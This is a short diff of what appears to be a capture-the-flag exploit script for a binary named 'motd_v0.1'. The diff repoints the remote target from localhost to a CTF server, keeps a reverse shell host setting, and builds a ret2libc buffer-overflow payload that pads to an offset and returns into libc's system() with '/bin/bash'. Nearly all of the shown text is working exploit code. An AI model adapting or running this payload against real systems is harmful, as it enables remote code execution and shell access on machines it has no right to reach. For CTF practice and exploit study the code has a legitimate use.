@@ -31,7 +31,7 @@ Explanation:
         | A/bin/ba | <- RSP starts at 'A', but RDI points to '/bin/bash...'
 """
 
-REMOTE = ('127.0.0.1', 3001) # Remote to exploit or None
+REMOTE = ('ctf.segfault.me', 3001) # Remote to exploit or None
 # REMOTE = None
 TARGET = '../bin/motd_v0.1' # Local binary path (must be identical on server)
 LHOST  = "10.0.0.105"        # Reverse shell host
@@ -60,7 +60,6 @@ else:
     PAYLOAD = "A" + PAYLOAD + "A" * (OFFSET - len(PAYLOAD) - 1)
     # Directly call libc's system()
     PAYLOAD += SYSTEM # ret2libc
-    print PAYLOAD.encode('hex')
 
 if not DEBUG:
     p = process(TARGET) if REMOTE is None else remote(*REMOTE)
